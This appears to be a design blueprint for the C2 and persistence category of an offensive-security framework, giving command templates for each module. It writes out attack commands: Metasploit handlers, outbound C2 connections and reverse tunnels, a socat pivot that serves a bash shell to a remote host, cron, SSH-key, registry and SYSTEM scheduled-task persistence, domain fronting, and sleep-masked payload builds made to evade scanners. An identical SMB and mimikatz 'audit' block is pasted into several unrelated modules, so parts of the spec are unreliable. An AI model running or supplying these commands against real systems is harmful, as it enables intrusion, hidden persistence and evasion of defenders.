# C2 Server & Persistence — Category Blueprint

**Category:** `C2_PERSISTENCE` | **Slug:** `c2` | **Tools Dir:** `~/jabber/jabber-tools/c2/`
**Package:** `com.jabber.jabber.modules.c2` + `persistence` + `utilities` | **Group:** Operations & Assets

---

## ToolManager: `c2/ToolManager.java`

| ID | Binary | Source | Version Check | Install Method |
|----|--------|--------|---------------|----------------|
| `msfconsole` | `msfconsole` | apt (metasploit-framework) | `msfconsole -v` | `apt_install` |
| `chisel` | `chisel` | `jpillora/chisel` | `chisel --version` | `github_release` |
| `ligolo-ng` | `ligolo-agent/proxy` | `nicocha30/ligolo-ng` | `ligolo-proxy --help` | `github_release` |
| `socat` | `socat` | apt | `socat -V` | `apt_install` |
| `ncat` | `ncat` | apt (nmap) | `ncat --version` | `apt_install` |
| `ssh` | `ssh` | system (openssh) | `ssh -V` | system |
| `openssl` | `openssl` | system | `openssl version` | system |
| `proxychains` | `proxychains4` | apt | `proxychains4 --help` | `apt_install` |
| `iptables` | `iptables` | system | `iptables --version` | system |
| `dig` | `dig` | apt (dnsutils) | `dig -v` | `apt_install` |
| `whois` | `whois` | apt/pkg | `whois --version` | `apt_install` |

---

## Modules

## Standardized Infrastructure
Every module in this category MUST implement the following self-contained architecture, located in its own dedicated package (e.g., `com.jabber.jabber.modules.<category>.<module_name>/`):

- **`[ModuleName]Module.java`**: The primary controller that defines the `@JABBERModule` metadata, declares the `ModuleInputField` schemas for each execution mode, and handles the orchestration between the UI and the execution engine.
- **`[ModuleName]Engine.java`**: The core execution orchestrator that implements the mandatory 8-step execution doctrine. It manages the high-level logic, tool sequencing, and results aggregation.
- **`ToolManager.java`**: Registry for the 5+ required tools. Handles tool status checks, versioning, and automatic dependency installation via OS-specific package managers (apt, pip, github_release).
- **`InputSanitizer.java`**: Mode-aware validation logic that ensures all inputs (IPs, domains, file paths) are sanitized and conform to security best practices before process execution.
- **`ProcessExecutor.java`**: A thread-safe, low-level process runner that manages `ProcessBuilder` lifecycles, real-time stdout/stderr streaming, and timeout enforcement.
- **`CommandRecord.java`**: A structured data container that captures full telemetry for every command executed (CLI strings, exit codes, durations, and output previews) for the final report.
- **`ReportGenerator.java`**: The findings aggregator that transforms raw tool output and `CommandRecord` data into high-fidelity, structured reports in JSON, Markdown, and HTML formats. It is strictly responsible for capturing, organizing, and physically saving all generated outputs (files, payloads, artifacts) into the reporting structure.

---

## Execution Doctrine (MANDATORY - SURGICAL)

Every module MUST implement the following 8-step execution loop in its `[ModuleName]Engine.java`:

1.  **Validate Mode**: Verify that the selected `ModuleMode` is supported and available.
2.  **Sanitize Schema**: Validate and sanitize all user-provided inputs against the mode-specific schema using `InputSanitizer`.
    - **Failure**: If mandatory input is missing, return `[Input required for execution]`.
3.  **Target Intelligence**: Perform mandatory infrastructure discovery (DNS resolution, WHOIS lookup, server fingerprinting via `dnsx`, `subfinder`, `httpx`).
4.  **Tool Readiness & Verification**: Resolve binary paths via `ToolManager` AND verify the specific tools explicitly selected by the user for this execution.
    - **Failure**: If `selectedTools` list is empty, return `[Must select a tool for execution]`.
5.  **Surgical Command Orchestration**: Build the exact command strings and arguments ONLY for the external tools that were explicitly selected by the user via the frontend toggles.
    - If a tool is not selected, it MUST NOT execute.
    - If one tool is selected, only its command logic runs.
    - If multiple tools are selected, only those tools' commands run sequentially.
6.  **Real-Time Streaming**: Execute selected tools sequentially via `ProcessExecutor` and stream live stdout/stderr logs to the `TaskContext` for UI visibility.
7.  **Findings Extraction**: Parse raw tool output using `ReportGenerator` to identify and extract high-fidelity security findings.
    - **Anti-Pollution**: Findings MUST be flat and professional. Remove CLI strings and durations from executive finding reports.
8.  **Full Telemetry**: Aggregate all telemetry data into the final `ModuleResult` for complete auditability.

---

### Output & Transparency

- **NO Phantom Findings**: If a tool returns no data or an error, no finding is generated. Every result must be verified by real data.
- **Full Traceability**: Every report must include the exact CLI commands executed to ensure transparency and reproducibility.
- **Multi-Format Delivery**: Findings are generated simultaneously in JSON (for automation), HTML (for presentation), and Markdown (for documentation).

---

## Artifact & Output Generation Standard (J. Standard)
Every module in this category MUST physically create and preserve the following outputs:
- **Location**: `reports/artifacts/`, `reports/payloads/`, `reports/outputs/`, or `reports/analysis/` within the module workspace.
- **Naming**: `[Mode]_[Timestamp]_[OriginalName].[Ext]`
- **Hashing**: Mandatory SHA256 hashing for all generated files.
- **Reporting**: All files must be linked and accessible via the final `ReportGenerator` output.

---

## Frontend Requirements

Every module in the **C2 & Persistence** category MUST implement the following UI components to ensure seamless interaction with the V5 architecture:

1. **Execution Mode Toggle**: Switch between operations.
2. **Dynamic Tool Selection Table**: Once an execution mode is selected, render a horizontal table listing all tools associated with that mode. The user must be able to toggle individual tools on/off to directly control execution behavior.
3. **Artifact Integration**: Direct links to the **Artifacts System (Category 21)** for downloading results and logs.
4. **Live Terminal Stream**: A real-time stdout/stderr streaming component for operational transparency.
5. **Interactive Dashboard**: Real-time display of extracted data, payloads, or process progress.

---

---

## Modules

### 1. C2 Server Orchestrator
**ID:** `c2-server` | **Risk:** CRITICAL | **File:** `C2ServerModule.java`
**Tools:** `msfconsole`, `ncat`, `socat`, `openssl`, `dig`

#### Execution Modes:

- **`LSTN`** (Short Name: `LSTN`)
    - **Purpose**: Orchestrate and deploy multi-handler listeners for command-and-control sessions.
    - **Input Schema**: `{ lhost: String, lport: int, payload: String }`
    - **Multi-Tool Command Logic**:
        1. `msfconsole -x "use multi/handler; set PAYLOAD <payload>; set LHOST <lhost>; set LPORT <lport>; run"` (Core Metasploit Handler)
        2. `ncat -lvp <lport> --ssl` (Emergency Ncat Backup)
        3. `socat -d -d TCP4-LISTEN:<lport>,reuseaddr,fork OPENSSL-LISTEN:<lport>,cert=cert.pem,verify=0` (Advanced Socat Pivot)
        4. `openssl s_server -accept <lport> -cert cert.pem -key key.pem` (Raw SSL Audit)
        5. `dig +short <lhost>` (Liveness Verification)
    - **Execution Flow**: Core Handler -> Ncat Backup -> Socat Pivot -> SSL Audit -> Liveness Verify.
    - **Output Generation & Artifacts**:
        - `reports/outputs/LISTEN_[Timestamp]_c2_server.log`: Execution log of the C2 server listener session.
        - `reports/artifacts/LISTEN_[Timestamp]_socat_relay.bin`: Captured binary relay data from the socat pivot.
        - `reports/analysis/LISTEN_[Timestamp]_ssl_audit.json`: Detailed report on the SSL/TLS listener configuration.

- **`CERT`** (Short Name: `CERT`)
    - **Purpose**: Generate and audit cryptographic certificates for secure C2 transport.
    - **Input Schema**: `{ common_name: String }`
    - **Multi-Tool Command Logic**:
        1. `openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=<common_name>"` (Core Cert Gen)
        2. `openssl x509 -in cert.pem -text -noout` (Certificate Audit)
        3. `msfconsole -v` (Framework Check)
        4. `ncat --version` (Binary Check)
        5. `socat -V` (Binary Check)
    - **Execution Flow**: Core Cert Gen -> Cert Audit -> Framework Check -> Binary Check x2.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/CERT_[Timestamp]_cert.pem`: Generated cryptographic certificate for secure transport.
        - `reports/artifacts/CERT_[Timestamp]_key.pem`: Associated private key for the generated certificate.
        - `reports/analysis/CERT_[Timestamp]_cert_audit.txt`: Technical audit of the certificate's metadata and validity.

---

### 2. C2 Client Controller
**ID:** `c2-client` | **Risk:** HIGH | **File:** `C2ClientModule.java`
**Tools:** `ncat`, `socat`, `chisel`, `ssh`, `openssl`

#### Execution Modes:

- **`CONN`** (Short Name: `CONN`)
    - **Purpose**: Establish an encrypted outbound connection to a remote C2 infrastructure.
    - **Input Schema**: `{ host: String, port: int }`
    - **Multi-Tool Command Logic**:
        1. `ncat --ssl <host> <port>` (Core Ncat Connect)
        2. `socat OPENSSL:<host>:<port>,verify=0 -` (Socat SSL Alternative)
        3. `chisel client <host>:<port> R:socks` (Chisel Tunneling)
        4. `ssh -v -p <port> <host>` (SSH Protocol Audit)
        5. `openssl s_client -connect <host>:<port>` (Handshake Audit)
    - **Execution Flow**: Core Connect -> Socat Alternative -> Chisel Tunneling -> SSH Audit -> Handshake Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/CONNECT_[Timestamp]_client_session.log`: Log of the outbound C2 connection and session metadata.
        - `reports/artifacts/CONNECT_[Timestamp]_chisel_telemetry.json`: Technical telemetry from the Chisel client session.
        - `reports/analysis/CONNECT_[Timestamp]_handshake_audit.json`: Detailed report on the SSL/TLS handshake with the C2 server.

- **`TUNL`** (Short Name: `TUNL`)
    - **Purpose**: Create high-performance HTTP/Websocket tunnels for C2 traffic evasion.
    - **Input Schema**: `{ host: String, port: int, remote_port: int }`
    - **Multi-Tool Command Logic**:
        1. `chisel client <host>:<port> R:<remote_port>:127.0.0.1:4444` (Core Chisel Tunnel)
        2. `socat TCP4-LISTEN:<remote_port>,fork TCP4:<host>:<port>` (Socat Port Forward)
        3. `ncat -lp <remote_port> --sh-exec "ncat <host> <port>"` (Ncat Relay)
        4. `openssl version` (Binary Check)
        5. `ssh -V` (Binary Check)
    - **Execution Flow**: Core Chisel -> Socat Forward -> Ncat Relay -> Binary Check x2.
    - **Output Generation & Artifacts**:
        - `reports/outputs/TUNNEL_[Timestamp]_tunnel_stats.json`: Performance and usage statistics for the established tunnel.
        - `reports/artifacts/TUNNEL_[Timestamp]_relay_config.txt`: Configuration and routing table for the socat/ncat relay.
        - `reports/analysis/TUNNEL_[Timestamp]_binary_status.json`: Verification of chisel, socat, and ncat availability.

---

### 3. Persistence Management Tool
**ID:** `persist-multi` | **Risk:** CRITICAL | **File:** `PersistenceModule.java`
**Tools:** `crontab`, `systemctl`, `reg`, `schtasks`, `ssh-keygen`

#### Execution Modes:

- **`UNIX`** (Short Name: `UNIX`)
    - **Purpose**: Implement multi-layered persistence on Unix-based systems via cron and systemd.
    - **Input Schema**: `{ name: String, command: String }`
    - **Multi-Tool Command Logic**:
        1. `(crontab -l 2>/dev/null; echo "@reboot <command>") | crontab -` (Core Cron Job)
        2. `systemctl enable <name>` (Systemd Activation)
        3. `ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N ""` (Authorized Key Gen)
        4. `cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys` (Key Persistence)
        5. `ls -la /etc/cron.d/` (Inventory Audit)
    - **Execution Flow**: Core Cron -> Systemd -> Key Gen -> Key Persistence -> Inventory Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/UNIX_[Timestamp]_persistence_map.json`: Map of all implemented persistence mechanisms on the target.
        - `reports/artifacts/UNIX_[Timestamp]_id_rsa.pub`: Public key added to the authorized_keys file for persistence.
        - `reports/analysis/UNIX_[Timestamp]_inventory_audit.txt`: Audit of existing cron and systemd units for detection.

- **`WIN`** (Short Name: `WIN`)
    - **Purpose**: Implement persistence on Windows systems via Registry and Scheduled Tasks.
    - **Input Schema**: `{ name: String, path: String }`
    - **Multi-Tool Command Logic**:
        1. `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <name> /t REG_SZ /d <path> /f` (Core Registry Run)
        2. `schtasks /create /tn <name> /tr <path> /sc onlogon /ru system` (Scheduled Task)
        3. `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run` (Registry Audit)
        4. `schtasks /query /tn <name>` (Task Audit)
        5. `ssh-keygen -V` (Binary Check)
    - **Execution Flow**: Core Registry -> Scheduled Task -> Registry Audit -> Task Audit -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/WIN_[Timestamp]_persistence_report.json`: Detailed report on registry and task-based persistence.
        - `reports/artifacts/WIN_[Timestamp]_registry_keys.reg`: Export of the registry keys modified for persistence.
        - `reports/analysis/WIN_[Timestamp]_task_audit.xml`: XML definition and status of the scheduled task.

---

### 4. DNS Beacon Controller
**ID:** `c2-beacon-dns` | **Risk:** HIGH | **File:** `BeaconDNSModule.java`
**Tools:** `ncat`, `dig`, `socat`, `python3`, `openssl`

#### Execution Modes:

- **`LSTN`** (Short Name: `LSTN`)
    - **Purpose**: Deploy a stealthy DNS-based listener to capture and decode inbound beacon signals.
    - **Input Schema**: `{ domain: String, port: int }`
    - **Multi-Tool Command Logic**:
        1. `ncat -u -l -p <port> -k` (Core UDP Listener)
        2. `socat UDP4-LISTEN:<port>,fork -` (UDP Socat Backup)
        3. `python3 dns_server.py --domain <domain> --port <port>` (Custom DNS Script)
        4. `dig @127.0.0.1 -p <port> <domain> A` (Local Resolver Test)
        5. `openssl version` (Binary Check)
    - **Execution Flow**: Core UDP -> Socat Backup -> DNS Script -> Resolver Test -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/LISTEN_[Timestamp]_dns_beacon.log`: Execution log of the DNS beacon listener.
        - `reports/artifacts/LISTEN_[Timestamp]_dns_traffic.pcap`: Captured UDP traffic from the DNS beacon sessions.
        - `reports/analysis/LISTEN_[Timestamp]_resolver_test.json`: Verification of the local DNS resolver and zone delegation.

- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify DNS infrastructure readiness and zone delegation for beaconing.
    - **Input Schema**: `{ domain: String }`
    - **Multi-Tool Command Logic**:
        1. `dig +trace <domain>` (Core Delegation Audit)
        2. `dig NS <domain>` (Name Server Audit)
        3. `ncat -v -u -z <domain> 53` (Port Liveness Check)
        4. `socat -V` (Binary Check)
        5. `python3 --version` (Binary Check)
    - **Execution Flow**: Delegation Audit -> NS Audit -> Port Liveness -> Binary Check x2.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_delegation_report.json`: Detailed audit of DNS zone delegation and records.
        - `reports/artifacts/AUDIT_[Timestamp]_dig_output.txt`: Raw console output from the dig infrastructure discovery.
        - `reports/analysis/AUDIT_[Timestamp]_port_liveness.xml`: Nmap audit of the target's DNS service ports.

---

### 5. Proxy Pivot Manager
**ID:** `c2-proxy-pivot` | **Risk:** CRITICAL | **File:** `ProxyPivotModule.java`
**Tools:** `chisel`, `ligolo-ng`, `proxychains`, `socat`, `ssh`

#### Execution Modes:

- **`SCKS`** (Short Name: `SCKS`)
    - **Purpose**: Establish a robust SOCKS5 proxy infrastructure for internal network pivoting.
    - **Input Schema**: `{ host: String, port: int }`
    - **Multi-Tool Command Logic**:
        1. `chisel server -p <port> --socks5` (Core Chisel SOCKS)
        2. `ligolo-proxy -selfcert -laddr 0.0.0.0:<port>` (Ligolo Proxy Alternative)
        3. `socat TCP4-LISTEN:<port>,fork SOCKS4A:127.0.0.1:localhost:80,socksport=1080` (Socat SOCKS Relay)
        4. `ssh -D <port> -N 127.0.0.1` (SSH Dynamic Forwarding)
        5. `proxychains4 -f proxychains.conf curl http://ifconfig.me` (Tunnel Validation)
    - **Execution Flow**: Core Chisel -> Ligolo Proxy -> Socat Relay -> SSH Forwarding -> Tunnel Validation.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SOCKS_[Timestamp]_proxy_inventory.json`: Inventory of all active SOCKS proxy listeners and ports.
        - `reports/artifacts/SOCKS_[Timestamp]_ligolo_cert.pem`: Self-signed certificate used for the Ligolo proxy session.
        - `reports/analysis/SOCKS_[Timestamp]_tunnel_validation.log`: Results of the end-to-end tunnel connectivity validation.

- **`REVR`** (Short Name: `REVR`)
    - **Purpose**: Establish a reverse pivot connection from a compromised internal host.
    - **Input Schema**: `{ host: String, port: int, remote_port: int }`
    - **Multi-Tool Command Logic**:
        1. `chisel client <host>:<port> R:<remote_port>:socks` (Core Reverse Chisel)
        2. `ligolo-agent -connect <host>:<port> -ignore-cert` (Ligolo Agent Alternative)
        3. `socat TCP4:<host>:<port> EXEC:"proxychains4 bash"` (Socat Bash Pivot)
        4. `ssh -R <remote_port>:localhost:22 <host>` (SSH Reverse Tunnel)
        5. `proxychains4 --version` (Binary Check)
    - **Execution Flow**: Core Reverse Chisel -> Ligolo Agent -> Socat Bash -> SSH Reverse -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/REVERSE_[Timestamp]_pivot_session.log`: Technical log of the reverse pivot connection and activity.
        - `reports/artifacts/REVERSE_[Timestamp]_bash_relay.bin`: Captured data from the socat bash pivot relay.
        - `reports/analysis/REVERSE_[Timestamp]_binary_status.json`: Verification of chisel, ligolo, and ssh client readiness.

---

### 6. HTTP Beacon Controller
**ID:** `c2-beacon-http` | **Risk:** HIGH | **File:** `BeaconHTTPModule.java`
**Tools:** `ncat`, `socat`, `python3`, `curl`, `openssl`

#### Execution Modes:

- **`LSTN`** (Short Name: `LSTN`)
    - **Purpose**: Deploy a stealthy HTTP-based listener to capture and decode inbound beacon signals.
    - **Input Schema**: `{ port: int, profile: Path }`
    - **Multi-Tool Command Logic**:
        1. `python3 http_server.py --port <port> --profile <profile>` (Core HTTP Server)
        2. `ncat -l -p <port> --ssl` (Emergency SSL Listener)
        3. `socat TCP4-LISTEN:<port>,fork OPENSSL-LISTEN:<port>,cert=cert.pem,verify=0` (Socat Pivot)
        4. `curl -I http://localhost:<port>` (Local Liveness Check)
        5. `openssl version` (Binary Check)
    - **Execution Flow**: Core Server -> Emergency Listener -> Socat Pivot -> Liveness Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/LISTEN_[Timestamp]_http_beacon.log`: Execution log of the HTTP beacon listener.
        - `reports/artifacts/LISTEN_[Timestamp]_http_traffic.pcap`: Captured HTTP traffic from the beacon sessions.
        - `reports/analysis/LISTEN_[Timestamp]_server_readiness.json`: Verification of the HTTP server and profile configuration.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 7. Domain Fronting Tool
**ID:** `c2-domain-front` | **Risk:** CRITICAL | **File:** `DomainFrontModule.java`
**Tools:** `curl`, `dig`, `openssl`, `python3`, `ncat`

#### Execution Modes:

- **`CONF`** (Short Name: `CONF`)
    - **Purpose**: Configure and validate domain fronting profiles for C2 traffic evasion.
    - **Input Schema**: `{ host: String, front: String, target: String }`
    - **Multi-Tool Command Logic**:
        1. `curl -v -H "Host: <host>" https://<front>/<target>` (Core Fronting Test)
        2. `dig +short <front>` (Edge Resolution Check)
        3. `openssl s_client -connect <front>:443 -servername <front>` (TLS Audit)
        4. `python3 check_front.py --host <host> --front <front>` (Automated Audit)
        5. `ncat --version` (Binary Check)
    - **Execution Flow**: Resolution Check -> TLS Audit -> Core Fronting Test -> Automated Audit -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/CONFIG_[Timestamp]_fronting_report.json**: Detailed report on domain fronting success and edge resolution.
        - `reports/artifacts/CONFIG_[Timestamp]_tls_handshake.txt`: Log of the TLS handshake with the fronting edge.
        - `reports/analysis/CONFIG_[Timestamp]_edge_metadata.json`: Fingerprint of the CDN/Cloud provider edge infrastructure.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 8. Sleep Mask Tool
**ID:** `c2-sleepmask` | **Risk:** CRITICAL | **File:** `SleepMaskModule.java`
**Tools:** `gcc`, `nasm`, `msfvenom`, `donut`, `upx`

#### Execution Modes:

- **`GEN`** (Short Name: `GEN`)
    - **Purpose**: Generate advanced sleep-masking payloads to evade in-memory scanners.
    - **Input Schema**: `{ payload: String, mask_type: String }`
    - **Multi-Tool Command Logic**:
        1. `gcc -o masked_payload.exe sleepmask.c -DTYPE=<mask_type>` (Core Masking Engine)
        2. `nasm -f win64 mask_stub.asm` (Assembly Logic)
        3. `donut -i masked_payload.exe -o masked.bin` (Shellcode Conversion)
        4. `upx --best masked_payload.exe` (Compression)
        5. `msfvenom -v` (Binary Check)
    - **Execution Flow**: Core Masking -> Assembly -> Conversion -> Compression -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/payloads/GEN_[Timestamp]_masked_beacon.bin`: Final weaponized beacon with integrated sleep-masking.
        - `reports/artifacts/GEN_[Timestamp]_mask_telemetry.json`: Technical telemetry from the masking engine execution.
        - `reports/analysis/GEN_[Timestamp]_stub_inventory.json`: Inventory of available sleep-masking assembly stubs.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 9. SOCKS5 Server Tool
**ID:** `c2-socks5` | **Risk:** HIGH | **File:** `Socks5ServeModule.java`
**Tools:** `ncat`, `socat`, `python3`, `ssh`, `chisel`

#### Execution Modes:

- **`LSTN`** (Short Name: `LSTN`)
    - **Purpose**: Deploy a standalone SOCKS5 proxy server for internal routing.
    - **Input Schema**: `{ port: int, user: String, pass: Password }`
    - **Multi-Tool Command Logic**:
        1. `chisel server -p <port> --socks5` (Core Chisel SOCKS)
        2. `python3 socks_server.py --port <port> --user <user> --pass <pass>` (Custom SOCKS Script)
        3. `ssh -D <port> -N 127.0.0.1` (SSH Dynamic Forwarding)
        4. `socat TCP4-LISTEN:<port>,fork SOCKS4A:127.0.0.1:localhost:80` (Socat Relay)
        5. `ncat -v -z 127.0.0.1 <port>` (Local Liveness Check)
    - **Execution Flow**: Core Chisel -> Custom Script -> SSH Forwarding -> Socat Relay -> Liveness Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/LISTEN_[Timestamp]_socks_status.json`: Verification of the SOCKS5 proxy listener and authentication.
        - `reports/artifacts/LISTEN_[Timestamp]_proxy_relay.log`: Captured telemetry from the proxy relay session.
        - `reports/analysis/LISTEN_[Timestamp]_binary_readiness.json**: Verification of chisel, python3, and ssh availability.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.